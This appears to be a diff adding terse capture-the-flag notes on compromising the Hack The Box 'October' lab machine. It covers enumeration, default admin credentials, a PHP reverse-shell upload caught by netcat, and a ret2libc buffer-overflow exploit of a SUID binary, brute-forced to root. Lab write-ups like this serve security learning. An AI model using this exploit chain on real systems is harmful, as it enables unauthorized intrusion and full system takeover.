@@ -1,1 +1,324 @@
-1
+nmap scan it:
+
+kali@kali:~$ nmap -sC -sV -oA october 10.10.10.16
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 00:03 EDT
+Nmap scan report for 10.10.10.16
+Host is up (0.15s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
+|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
+|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
+|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-methods: 
+|_  Potentially risky methods: PUT PATCH DELETE
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: October CMS - Vanilla
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds
+
+
+check the web, it's a october frame on port 80, there's also DSA ssh there,not sure if we can use it
+
+kali@kali:~$ searchsploit october
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+October CMS - Upload Protection Bypass Code Execution (Metasploit)           | php/remote/47376.rb
+October CMS 1.0.412 - Multiple Vulnerabilities                               | php/webapps/41936.txt
+October CMS < 1.0.431 - Cross-Site Scripting                                 | php/webapps/44144.txt
+October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting              | php/webapps/44546.txt
+OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                        | php/webapps/42978.txt
+OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                  | php/webapps/43106.txt
+----------------------------------------------------------------------------- ---------------------------------
+
+
+
+kali@kali:~$ gobuster dir --url=http://10.10.10.16 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.16
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/06/08 00:24:42 Starting gobuster
+===============================================================
+/blog (Status: 200)
+/forum (Status: 200)
+/themes (Status: 301)
+/modules (Status: 301)
+/account (Status: 200)
+/tests (Status: 301)
+/storage (Status: 301)
+/plugins (Status: 301)
+/backend (Status: 302)
+Progress: 1035 / 220561 (0.47%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/06/08 00:29:02 Finished
+===============================================================
+
+
+interesting 302 with /backend, permantent redirect to a place
+
+
+use admin/admin to login
+
+kali@kali:/usr/share/webshells$ tree .
+.
+├── asp
+│   ├── cmd-asp-5.1.asp
+│   └── cmdasp.asp
+├── aspx
+│   └── cmdasp.aspx
+├── cfm
+│   └── cfexec.cfm
+├── jsp
+│   ├── cmdjsp.jsp
+│   └── jsp-reverse.jsp
+├── laudanum -> /usr/share/laudanum
+├── perl
+│   ├── perlcmd.cgi
+│   └── perl-reverse-shell.pl
+└── php
+    ├── findsocket
+    │   ├── findsock.c
+    │   └── php-findsock-shell.php
+    ├── php-backdoor.php
+    ├── php-reverse-shell.php
+    ├── qsd-php-backdoor.php
+    └── simple-backdoor.php
+
+
+
+
+change use the php rever file, and change the ip and extension to php5 to upload it
+
+backend -> blog shows a hit of the existing dr.php5 path
+we can use that as /storage/app/media/dr.php5 for shell.php5
+
+
+setup the listener for reverse shell
+
+kali@kali:~$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.16] 40336
+Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux
+ 08:10:57 up  1:18,  0 users,  load average: 0.00, 0.00, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+now we are www-data
+$ whoami
+www-data
+
+
+find user
+
+$ ls -al
+total 12
+drwxr-xr-x  3 root  root  4096 Apr 20  2017 .
+drwxr-xr-x 21 root  root  4096 May 17  2017 ..
+drwxr-xr-x  4 harry harry 4096 Apr 21  2017 harry
+$ cd harry      
+$ ls -al
+total 5044
+drwxr-xr-x 4 harry harry    4096 Apr 21  2017 .
+drwxr-xr-x 3 root  root     4096 Apr 20  2017 ..
+-rw------- 1 root  root        1 Dec 24  2017 .bash_history
+-rw-r--r-- 1 harry harry     220 Apr 20  2017 .bash_logout
+-rw-r--r-- 1 harry harry    3637 Apr 20  2017 .bashrc
+drwx------ 2 harry harry    4096 Apr 20  2017 .cache
+drwxr-xr-x 3 root  root     4096 Apr 20  2017 .composer
+-rw------- 1 root  root       10 May 17  2017 .nano_history
+-rw-r--r-- 1 harry harry     675 Apr 20  2017 .profile
+-rw-rw-r-- 1 harry harry 5123369 Apr 20  2017 october-1.0.412.tar.gz
+-r--r--r-- 1 harry harry      33 Apr 21  2017 user.txt
+
+
+find set user flag binary
+
+find / -perm -4000 2>/dev/null
+
+/usr/local/bin/ovrflw
+
+
+transfter back to local box
+
+cat ovrflw | base64 -w0
+
+echo "that thing" | base64 -d > ovrflw
+
+
+strings ovrflw find out there's strcpy
+
+
+install gdb-peda
+
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+echo "DONE! debug your program with gdb and enjoy"
+
+gdb ./ovrflw
+
+gdb-peda$ checksec
+CANARY    : disabled                                                                                                                       
+FORTIFY   : disabled                                                                                                                       
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+
+NX bit means we can't put our exec inside this
+
+
+gdb-peda$ pattern create 200
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+gdb-peda$ pset arg 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+gdb-peda$ pshow arg
+arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+gdb-peda$ r
+
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd500 ("AZAAxAAyA")
+EDX: 0xffffd24b ("AZAAxAAyA")
+ESI: 0xf7fb3000 --> 0x1dfd6c 
+EDI: 0xf7fb3000 --> 0x1dfd6c 
+EBP: 0x6941414d ('MAAi')
+ESP: 0xffffd200 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41384141 ('AA8A')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41384141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd200 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0004| 0xffffd204 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0008| 0xffffd208 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0012| 0xffffd20c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0016| 0xffffd210 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0020| 0xffffd214 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0024| 0xffffd218 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0028| 0xffffd21c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41384141 in ?? ()
+
+
+
+
+gdb-peda$ pattern_offset 0x41384141
+1094205761 found at offset: 112
+gdb-peda$ pattern_
+pattern_arg     pattern_create  pattern_env     pattern_offset  pattern_patch   pattern_search  
+gdb-peda$ pattern_search 
+Registers contain pattern buffer:
+EBP+0 found at offset: 108
+EIP+0 found at offset: 112
+Registers point to pattern buffer:
+[ECX] --> offset 191 - size ~9
+[EDX] --> offset 191 - size ~9
+[ESP] --> offset 116 - size ~84
+Pattern buffer found at:
+0xffffd18c : offset    0 - size  200 ($sp + -0x74 [-29 dwords])
+0xffffd441 : offset    0 - size  200 ($sp + 0x241 [144 dwords])
+References to pattern buffer found at:
+0xffffd160 : 0xffffd18c ($sp + -0xa0 [-40 dwords])
+0xffffd170 : 0xffffd18c ($sp + -0x90 [-36 dwords])
+0xffffd174 : 0xffffd441 ($sp + -0x8c [-35 dwords])
+0xffffd298 : 0xffffd441 ($sp + 0x98 [38 dwords])
+
+
+now we know the eip is at 112
+
+
+target host have ASLR enabled
+$ sysctl -a | grep -i random
+kernel.randomize_va_space = 2
+
+we have to use what's in the libc
+
+find in the libc with system() exit() and "/bin/sh"
+
+(gdb) p system
+$6 = {<text variable, no debug info>} 0xb758b310 <__libc_system>
+(gdb) p exit
+$7 = {<text variable, no debug info>} 0xb757e260 <__GI_exit>
+(gdb) find 0xb758b310, +9999999, "/bin/sh"    
+0xb76adbac
+warning: Unable to access 16000 bytes of target memory at 0xb76f7f34, halting search.
+1 pattern found.
+(gdb) x/s 0xb76adbac
+0xb76adbac:     "/bin/sh"
+
+
+we want to system , exit , shell
+remember up the stack, format each addr in reverse
+
+"\x10\xb3\x58\xb7\x60\xe2\x57\xb7\xac\xdb\x6a\xb7"
+
+
+while true; do /usr/local/bin/ovrflw $(python -c 'print "A" * 112 + "\x10\xb3\x58\xb7\x60\xe2\x57\xb7\xac\xdb\x6a\xb7"');done
+
+and finally the coredump stops
+
+Segmentation fault (core dumped)
+^[OQSegmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+
+/bin/sh: 1: Q: not found
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+whoami
+root
+
+
+pwd
+/
+cd /root
+ls -al
+total 32
+drwx------  3 root root 4096 Dec 24  2017 .
+drwxr-xr-x 21 root root 4096 May 17  2017 ..
+-rw-------  1 root root    1 Dec 24  2017 .bash_history
+-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
+drwx------  2 root root 4096 May  6  2017 .cache
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root  647 Dec 24  2017 .viminfo
+-r--------  1 root root   33 Apr 21  2017 root.txt
+cat root.txt
+
+
+
